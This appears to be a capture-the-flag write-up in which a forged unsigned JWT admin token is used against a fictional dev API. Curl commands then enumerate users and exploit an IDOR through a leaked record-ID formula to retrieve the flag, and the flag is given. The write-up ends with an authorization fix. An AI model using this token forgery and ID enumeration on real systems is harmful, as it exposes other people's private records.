#### Challenge:

Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!

---

#### Solution:

Chapter 2 left us with a forged `alg:none` admin token that the **dev** API trusts (it never verifies
the JWT signature), plus the metadata-addressing formula leaked by `/api/admin/conf`. "Count with Me"
is a nudge: the admin-only endpoint `GET /api/admin/users/{userId}/meta/{metaId}` is a full
**BOLA/IDOR** once you can *count* your way to any `metaId`.

**1. Reuse the forged admin token.** No signature, `role: ADMIN` — accepted on dev:

```bash
DEV=http://untraceable-dev-api.theylietoyou.tcc
TOK="eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6IkFETUlOIiwidXNlcm5hbWUiOiJhZG1pbiJ9."
```

**2. Enumerate the users.** There are 36 of them (ids 1–36):

```bash
curl -s "$DEV/api/admin/users?size=100" -H "Authorization: Bearer $TOK" \
  | grep -oE '"id":[0-9]+' | wc -l            # 36
```

**3. Recover the metaId formula.** `/api/admin/conf` hands over the arithmetic — this is the "count":

```bash
curl -s "$DEV/api/admin/conf" -H "Authorization: Bearer $TOK"
# metaId = baseOffset(154700) + userId*1000 + fieldOffset
# offsets: {FirstName:11, LastName:17, Email:23, Address:41, Sex:53, Data:99}
```

**4. Count through every user × field and grep for the flag.** It is hidden in the `Address`
metadata of **userId 17** (`ermartinez` / elena.rodriguez — the most prolific fake-news author):
`metaId = 154700 + 17*1000 + 41 = 171741`.

```bash
curl -s "$DEV/api/admin/users/17/meta/171741" -H "Authorization: Bearer $TOK" | grep -oE 'FLAG\{[^}]*\}'
# FLAG{Ugaa-S1zs-UwsE-uIUA}
```

The returned `content` is `"Gran Vía 34 219, Barcelona, Spain ; FLAG{Ugaa-S1zs-UwsE-uIUA}"` — the flag
tacked onto a plausible-looking address field.

**Next clue (→ Chapter 4 "Hidden Information").** While counting, every user's `Data` metaKey
(fieldOffset `99`, e.g. admin at `metaId 155799`) returns a ~128-byte **base64 encrypted blob**
rather than plaintext — the hidden information to decrypt in the following chapter.

**Fix:** enforce object-level authorization on metadata reads instead of relying on a role gate
alone; predictable/derivable record IDs combined with broken auth collapse straight into IDOR.

---

<details><summary>FLAG:</summary>

```
FLAG{Ugaa-S1zs-UwsE-uIUA}
```

</details>
<br/>
